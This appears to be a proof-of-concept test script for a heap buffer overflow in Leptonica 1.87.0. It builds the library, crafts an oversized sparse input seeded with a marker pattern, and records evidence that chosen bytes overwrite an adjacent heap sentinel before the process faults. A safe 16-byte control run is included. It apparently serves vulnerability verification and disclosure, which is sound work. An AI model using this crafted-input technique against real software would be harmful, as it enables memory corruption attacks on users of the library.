#!/usr/bin/env bash
# Plain (no sanitizer) real-library heap-neighborhood probe.
# Build build-plain first (see README); all inputs are local fixtures.
set -u
cd "$(dirname "$0")"
if [ ! -f build-plain/src/libleptonica.a ]; then
  cmake -S src -B build-plain -DCMAKE_BUILD_TYPE=Debug -DBUILD_PROG=OFF \
    -DSW_BUILD=OFF -DENABLE_ZLIB=OFF -DENABLE_PNG=OFF -DENABLE_GIF=OFF \
    -DENABLE_JPEG=OFF -DENABLE_TIFF=OFF -DENABLE_WEBP=OFF \
    -DENABLE_OPENJPEG=OFF > configure-build-plain.log 2>&1 || exit 2
  cmake --build build-plain --target leptonica -j4 \
    > build-build-plain.log 2>&1 || exit 2
fi
mkdir -p out evidence
BIG=evidence/sparse-big.bin
NEI=evidence/neighbor-big.bin
SAFE=evidence/safe-16.bin
[ -f "$BIG" ] || truncate -s 1000000001 "$BIG"
[ -f "$SAFE" ] || printf 'MISHE-LEPTONICA\0' > "$SAFE"

# The sentinel lands at an unknown small offset after ba->data; plant the
# chosen marker throughout the first kilobyte so whichever offset it is
# receives attacker-chosen bytes from the stream itself.
if [ ! -f "$NEI" ]; then
  cp --sparse=always "$BIG" "$NEI"
  off=208
  while [ "$off" -le 1024 ]; do
    printf 'MISHE-LEPTONICA' | dd of="$NEI" bs=1 seek="$off" conv=notrunc status=none
    off=$((off + 32))
  done
fi

gcc -O0 -g -fno-omit-frame-pointer -DHAVE_CONFIG_H \
  -I src/src -I build-plain/src \
  -Wl,--wrap=calloc -o out/real-neighbor neighbor.c \
  build-plain/src/libleptonica.a -lm || exit 2

PASS=0; FAIL=0
ok() { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }

printf '== plain real vulnerable 1.87.0, oversized stream with live sentinel\n'
A=$(out/real-neighbor "$NEI" 2>&1); RC=$?
printf '%s\n' "$A" > evidence/neighbor-plain-attack.out
printf '%s\n' "$A"
case "$A" in
  *'SIGNAL=SIGSEGV'*) ok 'oversized memcpy faults plain real process';;
  *) bad "expected SIGSEGV (rc=$RC)";;
esac
case "$A" in
  *'CHOSEN_AT_OFFSET='*) ok 'chosen stream bytes land in live adjacent sentinel before fault';;
  *) bad 'no chosen-byte readback from live sentinel';;
esac
case "$A" in
  *'FAULT_ADDR='*'FAULT_OFFSET_FROM_DATA='*) ok 'fault address and offset from ba->data captured';;
  *) bad 'no fault-address evidence';;
esac
case "$A" in
  *'MAPS_BEGIN'*'MAPS_END'*) ok 'live mappings captured at fault';;
  *) bad 'no /proc/self/maps evidence';;
esac

printf '== plain real vulnerable 1.87.0, safe 16-byte stream\n'
S=$(out/real-neighbor "$SAFE" 2>&1); SRC=$?
printf '%s\n' "$S" > evidence/neighbor-plain-safe.out
printf '%s\n' "$S"
case "$S" in
  *'SIZE=16'*'NO_FAULT=1'*) [ "$SRC" -eq 0 ] && ok 'safe stream leaves process intact' || bad "safe rc=$SRC";;
  *) bad 'safe stream result';;
esac

printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
